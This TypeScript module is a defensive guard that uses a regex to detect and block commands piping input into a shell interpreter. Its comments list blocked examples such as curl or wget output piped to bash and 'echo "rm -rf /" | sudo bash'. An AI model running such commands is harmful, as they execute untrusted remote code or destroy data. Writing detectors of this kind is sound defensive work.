import { SHELL_WRAPPERS } from '../../types.ts';

const REASON_PIPE_TO_SHELL =
  'Piping to shell can execute arbitrary code. Download and review the script first.';

/**
 * Pattern to detect pipe-to-shell commands like:
 * - curl ... | bash
 * - wget ... | sh
 * - cat script.sh | bash
 * - echo "commands" | sh
 * - curl ... |& bash (bash-specific pipe with stderr)
 *
 * The pattern matches:
 * 1. Any pipe operator (|, |&)
 * 2. Optional whitespace
 * 3. Optional wrappers (sudo, env, etc.)
 * 4. A shell command (bash, sh, zsh, etc.)
 * 5. End of string or another operator/whitespace
 */
function buildPipeToShellPattern(): RegExp {
  const shells = Array.from(SHELL_WRAPPERS).join('|');
  // Match pipe (including |&) followed by optional wrappers then a bare shell
  // The shell must be at end of string, followed by space, or followed by another operator
  // We use word boundary to avoid matching things like "bashrc"
  return new RegExp(
    `\\|&?\\s*(?:sudo\\s+|env\\s+(?:[A-Za-z_][A-Za-z0-9_]*=[^\\s]*\\s+)*)?(?:${shells})(?:\\s*$|\\s+[^-]|\\s*[;&|])`,
    'i',
  );
}

const PIPE_TO_SHELL_PATTERN = buildPipeToShellPattern();

/**
 * Detect commands that pipe input to a shell interpreter.
 *
 * These are dangerous because:
 * 1. The shell reads commands from stdin (the piped input)
 * 2. The piped content could be from an untrusted source (curl, wget, etc.)
 * 3. This is a classic "curl | bash" attack vector
 *
 * Examples blocked:
 * - curl https://example.com/script.sh | bash
 * - wget -O- https://example.com/install | sh
 * - cat /tmp/script | zsh
 * - echo "rm -rf /" | sudo bash
 *
 * Examples allowed:
 * - bash -c "echo hello" (not piped, uses -c flag)
 * - bash script.sh (not piped, runs file)
 * - echo "hello" | grep h (not piping to shell)
 */
export function detectPipeToShell(command: string): string | null {
  if (PIPE_TO_SHELL_PATTERN.test(command)) {
    return REASON_PIPE_TO_SHELL;
  }
  return null;
}
